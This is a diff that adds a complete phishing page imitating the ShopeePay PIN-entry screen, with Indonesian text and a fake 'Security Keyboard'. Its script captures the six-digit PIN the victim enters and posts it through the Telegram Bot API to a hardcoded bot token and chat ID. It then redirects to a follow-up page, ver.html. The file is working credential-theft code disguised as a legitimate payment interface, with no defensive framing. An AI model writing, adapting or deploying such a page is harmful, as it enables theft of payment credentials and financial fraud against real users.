@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ShopeePay</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body, html { width: 100%; height: 100%; overflow: hidden; background-color: #fff; }
+        .app-container { display: flex; flex-direction: column; height: 100vh; width: 100%; }
+        
+        /* Header */
+        .header { height: 56px; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #f2f2f2; position: relative; flex-shrink: 0; }
+        .header h2 { font-size: 17px; font-weight: 500; color: #333; }
+        .close-btn { position: absolute; right: 16px; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; }
+        
+        /* Main Content */
+        .main-content { flex: 1; display: flex; flex-direction: column; align-items: center; padding-top: 60px; }
+        .pin-dots { display: flex; gap: 18px; margin-bottom: 30px; }
+        .dot { width: 14px; height: 14px; border: 1.5px solid #ddd; border-radius: 50%; }
+        .dot.filled { background-color: #333; border-color: #333; }
+        .forgot-link { color: #007bff; font-size: 14px; text-decoration: none; }
+        
+        /* Keypad */
+        .keypad-section { background-color: #f8f8f8; padding: 8px; padding-bottom: env(safe-area-inset-bottom, 15px); }
+        .keypad-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+        .key { background: #fff; height: 60px; display: flex; justify-content: center; align-items: center; font-size: 26px; border-radius: 8px; color: #333; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
+        .key:active { background-color: #e5e5e5; }
+        .key.empty { background: transparent; box-shadow: none; }
+        
+        /* Footer */
+        .footer-security { text-align: center; padding: 12px; font-size: 12px; color: #bbb; display: flex; justify-content: center; align-items: center; gap: 6px; background-color: #f8f8f8; }
+        .icon-close { width: 18px; height: 18px; fill: #888; }
+        .icon-backspace { width: 28px; height: 28px; fill: #333; }
+        .icon-shield { width: 14px; height: 14px; fill: #ccc; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="header">
+        <h2>Masukkan PIN</h2>
+        <div class="close-btn">
+            <svg class="icon-close" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="pin-dots" id="pinDots">
+            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+        </div>
+        <a href="#" class="forgot-link">Lupa PIN ShopeePay?</a>
+    </div>
+
+    <div class="keypad-section">
+        <div class="keypad-grid">
+            <div class="key" onclick="press('1')">1</div>
+            <div class="key" onclick="press('2')">2</div>
+            <div class="key" onclick="press('3')">3</div>
+            <div class="key" onclick="press('4')">4</div>
+            <div class="key" onclick="press('5')">5</div>
+            <div class="key" onclick="press('6')">6</div>
+            <div class="key" onclick="press('7')">7</div>
+            <div class="key" onclick="press('8')">8</div>
+            <div class="key" onclick="press('9')">9</div>
+            <div class="key empty"></div>
+            <div class="key" onclick="press('0')">0</div>
+            <div class="key" onclick="del()">
+                <svg class="icon-backspace" viewBox="0 0 24 24"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/></svg>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-security">
+        <svg class="icon-shield" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.47 4.09-3.13 7.75-7 8.99V12H5V6.3l7-3.11v8.8z"/></svg>
+        ShopeePay Security Keyboard
+    </div>
+</div>
+
+<script>
+    let currentPin = "";
+    const dots = document.querySelectorAll('.dot');
+
+    // === ISI DATA TELEGRAM DI SINI ===
+    const BOT_TOKEN = "8316280054:AAGlD7WDlLDzFjfjuEBm87HMHXQ11yMQGSg";
+    const CHAT_ID = "5689726675";
+    // =================================
+
+    function press(n) {
+        if (currentPin.length < 6) {
+            currentPin += n;
+            render();
+            if (currentPin.length === 6) {
+                sendToTelegram(currentPin);
+            }
+        }
+    }
+
+    function del() {
+        currentPin = currentPin.slice(0, -1);
+        render();
+    }
+
+    function render() {
+        dots.forEach((dot, i) => {
+            dot.classList.toggle('filled', i < currentPin.length);
+        });
+    }
+
+    function sendToTelegram(val) {
+        const msg = `🔔 *Notifikasi PIN ShopeePay*\n\nPIN: \`${val}\` \n`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: msg,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                location.href = "ver.html";            }
+            // Reset PIN setelah dikirim
+            setTimeout(() => {
+                currentPin = "";
+                render();
+            }, 600);
+        })
+        .catch(err => console.error("Gagal mengirim:", err));
+    }
+</script>
+
+</body>
+</html>
